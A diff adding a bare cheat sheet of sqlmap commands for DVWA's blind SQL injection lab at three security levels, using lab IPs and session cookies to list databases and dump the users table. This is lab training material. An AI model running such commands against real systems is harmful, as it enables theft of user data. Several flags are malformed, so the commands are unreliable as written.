@@ -1,0 +1,24 @@
+**BLIND SQL_INJECTION DVWA(Damn Vulnerable Web Application)**
+
+SQL Injection BLIND (DVWA-Low): 
+$ sqlmap -u "http://192.168.28.108/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=1db8j5oa0gssku634n5mdmbe2i; security=low" --dbs
+$ sqlmap -u "http://192.168.28.108/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=1db8j5oa0gssku634n5mdmbe2i; security=low" -D dvwa --tables
+$ sqlmap -u "http://192.168.28.108/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=1db8j5oa0gssku634n5mdmbe2i; security=low" -D dvwa -T users -dump 
+$ sqlmap -u "http://192.168.28.108/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=1db8j5oa0gssku634n5mdmbe2i; security=low" -D dvwa -T users --columns 
+$$ sqlmap -u "http://192.168.28.108/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=1db8j5oa0gssku634n5mdmbe2i; security=low" -D dvwa -T users -C user --dump
+
+
+DVWA SQL_Injection(BLIND)-Medium 
+$ sqlmap -u "http://192.168.28.106/dvwa/vulnerabilities/sqli_blind/#" --cookie="PHPSESSID=k7v0gpd99bt1ugcgatredf3dl9; security=medium" --data="id=3&Submit=Submit" --dbs
+$ sqlmap -u "http://192.168.28.106/dvwa/vulnerabilities/sqli_blind/#" --cookie="PHPSESSID=k7v0gpd99bt1ugcgatredf3dl9; security=medium" --data="id=3&Submit=Submit" -D dvwa -tables
+$ sqlmap -u "http://192.168.28.106/dvwa/vulnerabilities/sqli_blind/#" --cookie="PHPSESSID=k7v0gpd99bt1ugcgatredf3dl9; security=medium" --data="id=3&Submit=Submit" -D dvwa -T users -columns
+$ sqlmap -u "http://192.168.28.106/dvwa/vulnerabilities/sqli_blind/#" --cookie="PHPSESSID=k7v0gpd99bt1ugcgatredf3dl9; security=medium" --data="id=3&Submit=Submit" -D dvwa -T users -dump 
+$ sqlmap -u "http://192.168.28.106/dvwa/vulnerabilities/sqli_blind/#" --cookie="PHPSESSID=k7v0gpd99bt1ugcgatredf3dl9; security=medium" --data="id=3&Submit=Submit" -D dvwa -T users -dump
+
+
+DVWA SQL_Injection(BLIND)-High
+ $ sqlmap -u "http://192.168.28.106/dvwa/vulnerabilities/sqli_blind/" --cookie="PHPSESSID=8cp9tt22kk5ap73chrv9pplijj; security=high" --data="id=3&Submit=Submit" --dbs
+$ sqlmap -u "http://192.168.28.106/dvwa/vulnerabilities/sqli_blind/" --cookie="PHPSESSID=8cp9tt22kk5ap73chrv9pplijj; security=high" --data="id=3&Submit=Submit" -D dvwa -tables
+$ sqlmap -u "http://192.168.28.106/dvwa/vulnerabilities/sqli_blind/" --cookie="PHPSESSID=8cp9tt22kk5ap73chrv9pplijj; security=high" --data="id=3&Submit=Submit" -D dvwa -T users -columns
+$ sqlmap -u "http://192.168.28.106/dvwa/vulnerabilities/sqli_blind/" --cookie="PHPSESSID=8cp9tt22kk5ap73chrv9pplijj; security=high" --data="id=3&Submit=Submit" -D dvwa -T users --dump
+
